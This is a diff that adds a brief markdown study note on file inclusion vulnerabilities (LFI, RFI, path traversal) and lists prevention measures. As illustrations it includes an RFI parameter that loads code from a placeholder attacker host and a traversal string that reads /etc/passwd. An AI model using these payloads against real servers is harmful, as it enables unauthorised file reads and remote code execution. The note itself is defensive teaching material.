@@ -1,0 +1,35 @@
+# File Inclusion
+
+File Inclusion is a web vulnerability where user-controlled input is used to include files without proper validation.
+
+## Types
+
+1.LFI (Local File Inclusion): Includes files from the target server.
+  ```Here attacker fetches file directly that is already exist on the server.
+
+2.RFI (Remote File Inclusion): Includes a file from a remote server.
+?page=http://ATTACKER/file.php
+
+One thing that make RFI different is that a attacker can point out to the server he controls to fetch a file malicious file and executing it giving attacker code execution on server.
+
+
+3.Path Traversal
+
+Used with LFI to access files outside the intended directory.
+
+../../../../etc/passwd
+
+Common targets:
+
+/etc/passwd
+/etc/hosts
+
+---LFI → RCE---
+In some configurations, LFI can be escalated to Remote Code Execution (RCE) by including a file containing attacker-controlled code.
+
+@Prevention:
+1.Validate and sanitize file paths.
+2.Use an allowlist of permitted files.
+3.Avoid directly using user input in file inclusion.
+4.Disable unnecessary remote file inclusion.
+5.Use proper file permissions.
